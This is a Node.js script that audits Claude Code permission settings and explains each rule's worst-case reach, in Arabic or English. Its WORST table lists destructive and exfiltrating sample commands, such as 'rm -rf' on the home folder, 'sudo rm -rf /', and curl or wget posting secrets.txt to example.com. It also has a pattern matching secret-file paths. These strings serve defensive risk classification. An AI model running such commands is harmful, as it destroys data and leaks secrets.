#!/usr/bin/env node
'use strict';
// approvals.js: reads Claude Code settings files and says, in plain words, what has been allowed
// and how far it reaches into the future (the worst thing each standing permission can cover).
//   node approvals.js --project <folder> [--user <settings.json>] [--activity <activity.jsonl>] [--lang ar|en] [--json]
// Text is Arabic by default; pass lang 'en' for English. Risk levels and tags never depend on the language.
const fs = require('fs');
const path = require('path');
const { classifyString, makeCtx } = require('../hook/permission_hook.js');

const RANK = { green: 0, yellow: 1, red: 2 };
const SCOPE = { user: 'كل مشاريعك', project: 'هالمشروع (ملف مشترك مع غيرك)', local: 'هالمشروع (عندك بس)' };
const SCOPE_EN = { user: 'all your projects', project: 'this project (a file shared with others)', local: 'this project (yours only)' };
// L(lang, arabic, english): picks the text for the language
const L = (lang, ar, en) => (lang === 'en' ? en : ar);
const langOf = (lang) => (lang === 'en' ? 'en' : 'ar');
const MODES = {
  bypassPermissions: { risk: 'red', text: 'وضع «تجاوز الصلاحيات»: Claude بيعمل أي شي بدون ما يسألك أبداً' },
  acceptEdits: { risk: 'yellow', text: 'وضع «قبول التعديلات»: تعديل الملفات بيمر بدون سؤال' },
  dontAsk: { risk: 'red', text: 'وضع «لا تسأل»: اللي مو ممنوع بيمر بدون سؤال' },
  plan: { risk: 'green', text: 'وضع «التخطيط»: Claude بيخطط وما بيغيّر شي' },
  default: { risk: 'green', text: 'الوضع العادي: بيسألك إلا اللي سمحت فيه' },
};
const MODES_EN = {
  bypassPermissions: 'Bypass permissions mode: Claude does anything without ever asking you',
  acceptEdits: 'Accept edits mode: file edits go through without asking',
  dontAsk: 'Don\'t ask mode: anything not forbidden goes through without asking',
  plan: 'Plan mode: Claude plans and changes nothing',
  default: 'Default mode: asks you unless you allowed it',
};

// what the widest rule for a program can cover; the worst of these decides the risk
const WORST = {
  rm: ['rm -rf ~/documents'], rmdir: ['rmdir -p ~/x'], git: ['git push --force origin main', 'git reset --hard', 'git clean -fdx'],
  npm: ['npm publish', 'npm install some-package'], pnpm: ['pnpm publish', 'pnpm add some-package'], yarn: ['yarn publish', 'yarn add some-package'],
  pip: ['pip install some-package'], pip3: ['pip3 install some-package'], gh: ['gh repo delete x --yes', 'gh release create v1'],
  docker: ['docker rm -f x'], curl: ['curl -X POST -d @secrets.txt https://example.com'], wget: ['wget --post-file=secrets.txt https://example.com'],
  python: ['python -c "import shutil; shutil.rmtree(\'/x\')"'], python3: ['python3 -c "import shutil; shutil.rmtree(\'/x\')"'],
  node: ['node -e "require(\'fs\').rmSync(\'/x\',{recursive:true})"'], bash: ['bash -c "rm -rf ~"'], sh: ['sh -c "rm -rf ~"'],
  find: ['find . -delete'], sed: ['sed -i s/a/b/ ~/.bashrc'], xargs: ['xargs rm'], chmod: ['chmod -R 777 /'],
  mv: ['mv x /etc/y'], cp: ['cp x /etc/y'], mkdir: ['mkdir -p ~/x'], touch: ['touch ~/x'], tee: ['tee ~/.bashrc'],
  npx: ['npx some-package'], sudo: ['sudo rm -rf /'], ssh: ['ssh host'], scp: ['scp x host:y'], kill: ['kill -9 1'],
};

function parseRule(raw) {
  const m = /^([A-Za-z_][\w-]*(?:__[\w.-]+)*)(?:\(([\s\S]*)\))?$/.exec(String(raw).trim());
  return m ? { tool: m[1], spec: m[2] } : { tool: String(raw), spec: undefined };
}

const WORST_TEXT_EN = {
  rm: 'deletes any file or folder on your machine, with no undo', rmdir: 'deletes folders', find: 'with -delete it deletes every file that matches the search', sed: 'can edit files in place, even outside the project',
  python: 'runs any python code: it can delete or send anything', python3: 'runs any python code: it can delete or send anything', node: 'runs any node code: it can delete or send anything',
  bash: 'runs any command', sh: 'runs any command', npm: 'publishes a package to the internet or installs packages from the internet', pnpm: 'publishes a package or installs packages', yarn: 'publishes a package or installs packages',
  mv: 'moves files anywhere and can overwrite existing ones', cp: 'copies files anywhere and can overwrite existing ones', chmod: 'changes permissions on a group of files', xargs: 'runs any command on a list', tee: 'writes to any file',
};
const WORST_TEXT = {
  rm: 'يمسح أي ملف أو مجلد على جهازك، بدون تراجع', rmdir: 'يمسح مجلدات', find: 'مع -delete بيمسح كل ملف بيطابق البحث', sed: 'ممكن يعدّل ملفات مباشرة، حتى برا المشروع',
  python: 'يشغّل أي كود python: ممكن يمسح أو يرسل أي شي', python3: 'يشغّل أي كود python: ممكن يمسح أو يرسل أي شي', node: 'يشغّل أي كود node: ممكن يمسح أو يرسل أي شي',
  bash: 'يشغّل أي أمر', sh: 'يشغّل أي أمر', npm: 'ينشر حزمة على الإنترنت أو يثبّت حزماً من الإنترنت', pnpm: 'ينشر حزمة أو يثبّت حزماً', yarn: 'ينشر حزمة أو يثبّت حزماً',
  mv: 'ينقل ملفات لأي مكان وممكن يستبدل موجود', cp: 'ينسخ ملفات لأي مكان وممكن يستبدل موجود', chmod: 'يغيّر صلاحيات مجموعة ملفات', xargs: 'يشغّل أي أمر على قائمة', tee: 'يكتب على أي ملف',
};
function bashRule(spec, ctx, lang) {
  if (spec === undefined || spec === '' || spec === '*') return { risk: 'red', plain: L(lang, 'أي أمر على جهازك بدون سؤال', 'any command on your machine, without asking'), worst: L(lang, 'أي شي: مسح ملفات، إرسال بيانات، تثبيت برامج', 'anything: deleting files, sending data, installing programs'), tags: ['delete', 'send', 'install', 'code'] };
  const wild = /(:\*|\s?\*)$/.test(spec) || /\*/.test(spec);
  const prefix = spec.replace(/(:\*|\s?\*)$/, '').trim();
  const words = prefix.split(/\s+/);
  const plainWide = wild ? L(lang, 'أي أمر بيبدأ بـ «' + prefix + '» بدون سؤال', 'any command that starts with "' + prefix + '", without asking') : '';
  if (wild && words.length === 1 && /^(cat|head|tail|less|more|type|strings|xxd|od|base64|hexdump)$/.test(words[0])) return { risk: 'red', plain: plainWide, worst: L(lang, 'يقدر يقرأ أي ملف على جهازك، حتى مفاتيحك وكلمات سرّك', 'can read any file on your machine, even your keys and passwords'), tags: ['secrets'] };
  if (wild && words.length === 1 && /^(grep|egrep|fgrep|rg|awk|ls|tree|du|stat|file)$/.test(words[0])) return { risk: 'yellow', plain: plainWide, worst: L(lang, 'يقدر يبحث ويقرأ بأي ملف على جهازك، بما فيها الأسرار', 'can search and read any file on your machine, secrets included'), tags: [] };
  if (wild && /^(python3?|node|ruby|perl|php|bash|sh|zsh)\s+-(c|e|p)$/.test(prefix)) return { risk: 'red', plain: plainWide, worst: L(lang, 'يشغّل أي كود مكتوب بالأمر: ممكن يمسح أو يرسل أي شي', 'runs any code written in the command: it can delete or send anything'), tags: ['code', 'delete', 'send'] };
  if (wild && /^sed\s+(-\w*i\w*|--in-place)/.test(prefix)) return { risk: 'red', plain: plainWide, worst: L(lang, 'يعدّل أي ملف على جهازك مباشرة، حتى برا المشروع', 'edits any file on your machine in place, even outside the project'), tags: ['outside'] };
  let cands;
  if (!wild) cands = [prefix];
  else if (words.length > 1) cands = [prefix + ' --force -f x', prefix];
  else cands = WORST[words[0]] || [words[0] + ' --force -f x'];
  let best = null;
  // the tier and the tags come from the Arabic wording (so they are the same in every language); only the displayed text changes
  for (const c of cands) { const v = classifyString(c, { ...ctx }, 'ar'); if (!best || RANK[v.tier] > RANK[best.tier]) best = { ...v, cmd: c }; }
  const plain = wild ? L(lang, 'أي أمر بيبدأ بـ «' + prefix + '» بدون سؤال', 'any command that starts with "' + prefix + '", without asking') : L(lang, 'هالأمر بالضبط بدون سؤال: «' + prefix + '»', 'exactly this command, without asking: "' + prefix + '"');
  if (/^أمر ما بعرفه/.test(best.effect || '')) return { risk: 'yellow', plain, worst: L(lang, 'برنامج ما بعرفه (' + words[0] + '): ما قدرت أحكم على أسوأ شي ممكن يعمله', 'a program I do not know (' + words[0] + '): I could not judge the worst thing it can do'), tags: [], cmd: best.cmd };
  const wide = wild && words.length === 1 && WORST_TEXT[words[0]] && RANK[best.tier] > 0;
  const bestEffect = lang === 'en' ? classifyString(best.cmd, { ...ctx }, 'en').effect : best.effect;
  const worstText = wide ? L(lang, WORST_TEXT[words[0]], WORST_TEXT_EN[words[0]]) : (best.effect ? bestEffect : L(lang, 'ما فيه خطر ظاهر', 'no obvious risk'));
  const worstAr = wide ? WORST_TEXT[words[0]] : (best.effect || 'ما فيه خطر ظاهر');
  const tags = tagsOf(best.effect); if (wide && /يمسح|ينشر|ينقل|يستبدل/.test(worstAr) && !tags.includes('delete') && /يمسح/.test(worstAr)) tags.push('delete');
  if (wide && /كود|أي أمر/.test(worstAr) && !tags.includes('code')) tags.push('code');
  return { risk: best.tier, plain, worst: worstText, tags, cmd: best.cmd };
}

function tagsOf(effect) {
  const e = effect || '', t = [];
  if (/يمسح|مسح|يفرّغ/.test(e)) t.push('delete');
  if (/يرفع|يرسل|ينشر|بيرسل|بينشر/.test(e)) t.push('send');
  if (/ينزّل|بينزّل|يثبّت|بيثبّت/.test(e)) t.push('install');
  if (/برا مجلد المشروع|خارج/.test(e)) t.push('outside');
  if (/كود|سكربت|shell|ما بقدر أعرف|ما بعرفه|ما قدرت/.test(e)) t.push('code');
  if (/أسرار|حساس/.test(e)) t.push('secrets');
  return t;
}

function pathRule(tool, spec, lang) {
  const writes = ['Edit', 'Write', 'MultiEdit', 'NotebookEdit'].includes(tool);
    const secret = /(\.ssh|\.aws|\.gnupg|\.env|credentials|id_rsa|\.npmrc|\.netrc)/i.test(String(spec || ''));
  const outside = /^(\/\/|~\/|[A-Za-z]:[\\/]|\/)/.test(String(spec || '')) && !/^\.\.?\//.test(String(spec || ''));
  const wide = /^(\*\*|\*|\/\*\*|\/\/\*\*|~\/\*\*)$/.test(String(spec || ''));
  if (!writes) {
    if (secret) return { risk: 'red', plain: L(lang, 'قراءة ملفات سرية (' + spec + ') بدون سؤال', 'reading secret files (' + spec + '), without asking'), worst: L(lang, 'يقدر يقرأ مفاتيحك وكلمات سرّك', 'can read your keys and passwords'), tags: ['secrets'] };
    if (outside && /(\*\*|\/\*)$/.test(String(spec))) return { risk: 'red', plain: L(lang, 'قراءة كل ملفات (' + spec + ') بدون سؤال', 'reading all files in (' + spec + '), without asking'), worst: L(lang, 'يقدر يقرأ ملفاتك الشخصية ومستنداتك', 'can read your personal files and documents'), tags: ['outside', 'secrets'] };
    if (outside) return { risk: 'yellow', plain: L(lang, 'قراءة ملفات برا المشروع (' + spec + ') بدون سؤال', 'reading files outside the project (' + spec + '), without asking'), worst: L(lang, 'يقدر يقرأ ملفات شخصية من جهازك', 'can read personal files from your machine'), tags: ['outside'] };
    return { risk: 'green', plain: L(lang, 'قراءة ملفات ' + (spec === undefined ? 'المشروع' : spec) + ' بدون سؤال', 'reading files in ' + (spec === undefined ? 'the project' : spec) + ', without asking'), worst: L(lang, 'قراءة فقط، ما بيغيّر شي', 'read-only, changes nothing'), tags: [] };
  }
  if (secret) return { risk: 'red', plain: L(lang, 'الكتابة على ملفات حساسة (' + spec + ') بدون سؤال', 'writing to sensitive files (' + spec + '), without asking'), worst: L(lang, 'يقدر يغيّر مفاتيحك أو إعداداتك السرية', 'can change your keys or secret settings'), tags: ['secrets', 'outside'] };
  if (outside || wide) return { risk: 'red', plain: L(lang, 'تعديل ملفات ' + (spec === undefined ? '' : '(' + spec + ') ') + 'برا المشروع بدون سؤال', 'editing files ' + (spec === undefined ? '' : '(' + spec + ') ') + 'outside the project, without asking'), worst: L(lang, 'يقدر يعدّل أو يستبدل أي ملف على جهازك', 'can edit or overwrite any file on your machine'), tags: ['outside'] };
  return { risk: 'yellow', plain: L(lang, 'تعديل أو إنشاء ملفات ' + (spec === undefined ? 'المشروع' : spec) + ' بدون سؤال', 'editing or creating files in ' + (spec === undefined ? 'the project' : spec) + ', without asking'), worst: L(lang, 'يقدر يستبدل أي ملف بهالنطاق، والتراجع بيعتمد على نسخة محفوظة', 'can overwrite any file in that scope, and undoing it depends on having a saved copy'), tags: [] };
}

// describe(raw, ctx, lang): lang is 'ar' (default) or 'en'; risk and tags are the same in both
function describe(raw, ctx, lang) {
  lang = langOf(lang);
  const { tool, spec } = parseRule(raw);
  if (tool === 'Bash') return bashRule(spec, ctx, lang);
  if (['Read', 'Edit', 'Write', 'MultiEdit', 'NotebookEdit', 'Glob', 'Grep', 'LS'].includes(tool)) return pathRule(tool, spec, lang);
  if (tool === 'WebFetch') return { risk: 'yellow', plain: spec ? L(lang, 'فتح صفحات من ' + spec.replace(/^domain:/, '') + ' بدون سؤال', 'opening pages from ' + spec.replace(/^domain:/, '') + ', without asking') : L(lang, 'فتح صفحات من أي موقع بدون سؤال', 'opening pages from any site, without asking'), worst: L(lang, 'ممكن يمرّر معلومات من مشروعك بعنوان الرابط', 'can pass information from your project out in the link address'), tags: ['send'] };
  if (tool === 'WebSearch') return { risk: 'yellow', plain: L(lang, 'بحث على الإنترنت بدون سؤال', 'searching the internet, without asking'), worst: L(lang, 'بيرسل كلمات البحث للإنترنت', 'sends the search words to the internet'), tags: ['send'] };
  if (tool === 'Task' || tool === 'Agent') return { risk: 'yellow', plain: L(lang, 'تشغيل وكلاء فرعيين بدون سؤال', 'running sub-agents, without asking'), worst: L(lang, 'كل وكيل بيعمل بصلاحياتك وما بتشوف شو بيعمل', 'each agent works with your permissions and you do not see what it does'), tags: ['code'] };
  if (tool.startsWith('mcp__')) {
    const parts = tool.split('__').slice(1), server = parts[0], fn = parts[1];
    if (!fn) return { risk: 'red', plain: L(lang, 'كل أدوات تطبيق «' + server + '» بدون سؤال', 'all the tools of the app "' + server + '", without asking'), worst: L(lang, 'قراءة وكتابة وإرسال وحذف بذاك التطبيق', 'reading, writing, sending and deleting in that app'), tags: ['send', 'delete'] };
    const ro = /(read|get|list|search|query|fetch|status|describe)/i.test(fn) && !/(delete|remove|write|create|update|send|post|push|publish|run|execute)/i.test(fn);
    return { risk: ro ? 'yellow' : 'red', plain: L(lang, 'أداة «' + fn + '» بتطبيق «' + server + '» بدون سؤال', 'the tool "' + fn + '" in the app "' + server + '", without asking'), worst: ro ? L(lang, 'قراءة من ذاك التطبيق', 'reading from that app') : L(lang, 'تغيير شي بذاك التطبيق (إرسال أو حذف أو نشر)', 'changing something in that app (sending, deleting or publishing)'), tags: ro ? [] : ['send'] };
  }
  if (['Skill', 'TodoWrite', 'TaskCreate', 'TaskUpdate', 'TaskList', 'TaskGet', 'AskUserQuestion', 'ToolSearch', 'ExitPlanMode'].includes(tool)) return { risk: 'green', plain: L(lang, tool + ' بدون سؤال', tool + ', without asking'), worst: L(lang, 'ما بيغيّر شي بجهازك', 'changes nothing on your machine'), tags: [] };
  return { risk: 'red', plain: L(lang, 'أداة ما بعرفها (' + tool + ') بدون سؤال', 'a tool I do not know (' + tool + '), without asking'), worst: L(lang, 'ما قدرت أحكم على أسوأ شي بتعمله', 'I could not judge the worst thing it can do'), tags: ['code'] };
}

function readJson(f) { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch (e) { return null; } }

// analyze({ project, user, activity, lang }): lang is 'ar' (default) or 'en'
function analyze(opts) {
  const lang = langOf(opts.lang);
  const scopeText = (k) => (lang === 'en' ? SCOPE_EN[k] : SCOPE[k]);
  const root = path.resolve(opts.project || '.');
  const ctx = makeCtx(root);
  const files = [];
  if (opts.user) files.push({ file: opts.user, scope: 'user' });
  files.push({ file: path.join(root, '.claude', 'settings.json'), scope: 'project' }, { file: path.join(root, '.claude', 'settings.local.json'), scope: 'local' });
  const out = { project: root, files: [], rules: [], mode: null, dirs: [], hooks: [], problems: [] };
  for (const f of files) {
    if (!fs.existsSync(f.file)) continue;
    const s = readJson(f.file);
    if (!s) { out.problems.push(L(lang, 'ما قدرت أقرأ ' + f.file, 'I could not read ' + f.file)); continue; }
    out.files.push({ file: f.file, scope: f.scope });
    const p = s.permissions || {};
    for (const kind of ['allow', 'ask', 'deny']) for (const raw of p[kind] || []) {
      const d = kind === 'deny' ? { risk: 'green', plain: L(lang, 'ممنوع: ', 'forbidden: ') + raw, worst: L(lang, 'محمي: Claude ما بيقدر يعمله', 'protected: Claude cannot do this'), tags: [] } : kind === 'ask' ? { ...describe(raw, ctx, lang), plain: L(lang, 'بيسألك دايماً: ', 'always asks you: ') + raw } : describe(raw, ctx, lang);
      out.rules.push({ source: f.scope, scopeText: scopeText(f.scope), kind, raw, ...d });
    }
    if (s.enableAllProjectMcpServers === true) out.rules.push({ source: f.scope, scopeText: scopeText(f.scope), kind: 'allow', raw: 'enableAllProjectMcpServers: true', risk: 'red', plain: L(lang, 'أي خادم تطبيقات (MCP) بملف .mcp.json بهالمشروع بيتفعّل تلقائياً بدون سؤال', 'any app server (MCP) in this project\'s .mcp.json is switched on automatically, without asking'), worst: L(lang, 'لو انضاف خادم جديد للمشروع (مثلاً من مشروع نسخته من الإنترنت) بيشتغل على جهازك بدون ما يسألك', 'if a new server is added to the project (for example from a project you copied from the internet), it runs on your machine without asking you'), tags: ['code'] });
    for (const n of s.enabledMcpjsonServers || []) out.rules.push({ source: f.scope, scopeText: scopeText(f.scope), kind: 'allow', raw: 'mcp server: ' + n, risk: 'yellow', plain: L(lang, 'تشغيل خادم التطبيقات «' + n + '» تلقائياً', 'starting the app server "' + n + '" automatically'), worst: L(lang, 'بيشغّل برنامجاً على جهازك وبيعطي Claude أدواته', 'runs a program on your machine and gives Claude its tools'), tags: [] });
    if (p.defaultMode) { out.mode = { source: f.scope, value: p.defaultMode, ...(MODES[p.defaultMode] || { risk: 'yellow', text: 'وضع ' + p.defaultMode }) }; if (lang === 'en') out.mode.text = MODES_EN[p.defaultMode] || 'Mode ' + p.defaultMode; }
    for (const d of p.additionalDirectories || []) {
      out.dirs.push({ source: f.scope, dir: d });
      out.rules.push({ source: f.scope, scopeText: scopeText(f.scope), kind: 'allow', raw: 'additionalDirectories: ' + d, risk: 'yellow', plain: L(lang, 'وصول Claude لمجلد برا المشروع: ', 'Claude access to a folder outside the project: ') + d, worst: L(lang, 'يقدر يقرأ ويعدّل ملفات هالمجلد بدون سؤال', 'can read and edit files in this folder without asking'), tags: ['outside'] });
    }
    if (s.hooks) out.hooks.push({ source: f.scope, events: Object.keys(s.hooks) });
  }
  const allow = out.rules.filter((r) => r.kind === 'allow');
  const caps = new Set(); allow.forEach((r) => r.tags.forEach((t) => caps.add(t)));
  if (out.mode && out.mode.value === 'bypassPermissions') ['delete', 'send', 'install', 'code'].forEach((t) => caps.add(t));
  if (out.dirs.length) caps.add('outside');
  const CAP = lang === 'en'
    ? { delete: 'delete files', send: 'send or publish to the internet', install: 'install programs', outside: 'reach files outside the project', code: 'run any code', secrets: 'read or change secrets' }
    : { delete: 'يمسح ملفات', send: 'يرسل أو ينشر على الإنترنت', install: 'يثبّت برامج', outside: 'يوصل لملفات برا المشروع', code: 'يشغّل أي كود', secrets: 'يقرأ أو يغيّر أسراراً' };
  const counts = { red: 0, yellow: 0, green: 0 }; allow.forEach((r) => counts[r.risk]++);
  const capList = Object.keys(CAP).filter((k) => caps.has(k)).map((k) => CAP[k]);
  const reach = capList.length ? L(lang, 'من هلق وطالع، Claude بيقدر ' + capList.join('، ') + ' بدون ما يسألك.', 'From now on, Claude can ' + (capList.length > 1 ? capList.slice(0, -1).join(', ') + ' and ' + capList[capList.length - 1] : capList[0]) + ' without asking you.') : L(lang, 'ما في صلاحيات دائمة بتخلّيه يعمل شي خطر بدون سؤال.', 'No standing permissions let it do anything risky without asking.');
  const modeLine = out.mode && out.mode.risk !== 'green' ? ' ' + out.mode.text + '.' : '';
  const keys = new Set(); caps.forEach((c) => keys.add(c));
  if (allow.some((r) => ['Edit', 'Write', 'MultiEdit', 'NotebookEdit'].includes(r.tool || parseRule(r.raw).tool)) || (out.mode && ['acceptEdits', 'bypassPermissions'].includes(out.mode.value))) keys.add('modify');
  out.summary = { capKeys: [...keys], allowed: allow.length, denied: out.rules.filter((r) => r.kind === 'deny').length, byRisk: counts, capabilities: capList, sentence: L(lang, 'سمحت بـ ' + allow.length + ' صلاحية دائمة (' + counts.red + ' منها خطر). ', 'You have allowed ' + allow.length + ' standing permission' + (allow.length === 1 ? '' : 's') + ' (' + counts.red + ' of them risky). ') + reach + modeLine };
  out.rules.sort((a, b) => RANK[b.risk] - RANK[a.risk] || (a.kind === 'deny') - (b.kind === 'deny'));
  if (opts.activity && fs.existsSync(opts.activity)) {
    const rows = fs.readFileSync(opts.activity, 'utf8').split('\n').filter(Boolean).map((l) => { try { return JSON.parse(l); } catch (e) { return null; } }).filter(Boolean);
    const t = { green: 0, yellow: 0, red: 0 }; rows.forEach((r) => t[r.tier]++);
    out.activity = { total: rows.length, byTier: t, redRecent: rows.filter((r) => r.tier === 'red').slice(-8).map((r) => ({ t: r.t, tool: r.tool, effect: r.effect })) };
  }
  return out;
}

module.exports = { analyze, describe, parseRule };

if (require.main === module) {
  const a = process.argv.slice(2), opt = {};
  for (let i = 0; i < a.length; i++) if (a[i].startsWith('--')) opt[a[i].slice(2)] = a[i + 1] && !a[i + 1].startsWith('--') ? a[++i] : true;
  const r = analyze(opt);
  const en = opt.lang === 'en';
  if (opt.json) { console.log(JSON.stringify(r, null, 1)); return; }
  console.log(r.summary.sentence + '\n');
  if (r.mode) console.log((en ? 'Mode: ' : 'الوضع: ') + r.mode.text + '\n');
  for (const x of r.rules) console.log((x.risk === 'red' ? '🔴' : x.risk === 'yellow' ? '🟡' : '🟢') + ' [' + x.scopeText + '] ' + x.plain + (en ? '\n    Worst it covers: ' : '\n    أسوأ شي بيغطيه: ') + x.worst);
}
